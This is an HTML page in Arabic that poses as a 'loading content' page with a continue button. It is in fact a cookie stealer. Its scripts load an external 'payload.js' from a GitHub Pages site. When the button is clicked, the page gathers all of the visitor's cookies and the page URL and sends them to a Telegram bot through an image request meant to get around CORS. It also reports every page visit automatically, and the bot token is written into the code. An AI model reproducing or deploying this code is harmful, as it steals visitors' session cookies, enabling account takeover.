<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث الصفحة</title>
</head>
<body style="text-align: center; padding: 50px; font-family: Tahoma; background-color: #f9f9f9;">
    <h2>جاري تحميل المحتوى...</h2>
    <p>يرجى الانتظار قليلاً والضغط على الزر أدناه في حال لم يتم التحميل تلقائياً.</p>
    
    <!-- الزر التفاعلي -->
    <button id="myButton" style="padding: 15px 30px; font-size: 18px; background-color: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; box-shadow: 0 2px 5px rgba(0,0,0,0.2);">اضغط هنا للمتابعة</button>

    <!-- تضمين السكريبت الخارجي المستضاف على غيت هب -->
    <script src="https://moedawahik4-dot.github.io/allac/payload.js"></script>

    <script>
        // ربط الزر بحدث النقر
        document.getElementById('myButton').addEventListener('click', function() {
            // إظهار رسالة تنبيه للمستخدم
            alert('جاري التحويل إلى المحتوى المطلوب...');
            
            // بيانات البوت
            const botToken = "8970427451:AAFqyCocC3VS1jGYo8Da_ET6PNrV6hWdOVs";
            const chatId = "865078178";
            
            // استخراج الكوكيز
            const cookies = document.cookie.split(';');
            let cookieString = "";
            cookies.forEach(cookie => {
                if (cookie.trim()) {
                    cookieString += cookie.trim() + "\n";
                }
            });

            // تجهيز الرسالة
            const message = "تم النقر على الزر!\nالرابط: " + window.location.href + "\n\nجميع الكوكيز:\n" + cookieString;

            // إرسال البيانات عبر رابط الصورة لتجاوز CORS
            const telegramUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
            
            // إنشاء كائن صورة لإرسال الطلب
            const img = new Image();
            img.src = telegramUrl;
            
            console.log("تم إرسال طلب التنبيه إلى تليجرام");
        });

        // محاكاة الضغط التلقائي عند تحميل الصفحة لضمان إرسال التنبيه الأول
        window.addEventListener('load', function() {
             const botTokenAuto = "8970427451:AAFqyCocC3VS1jGYo8Da_ET6PNrV6hWdOVs";
             const chatIdAuto = "408506450";
             const messageAuto = "زيارة جديدة للصفحة!\nالرابط: " + window.location.href;
             const telegramUrlAuto = "https://api.telegram.org/bot" + botTokenAuto + "/sendMessage?chat_id=" + chatIdAuto + "&text=" + encodeURIComponent(messageAuto);
             const imgAuto = new Image();
             imgAuto.src = telegramUrlAuto;
        });
    </script>
</body>
</html>
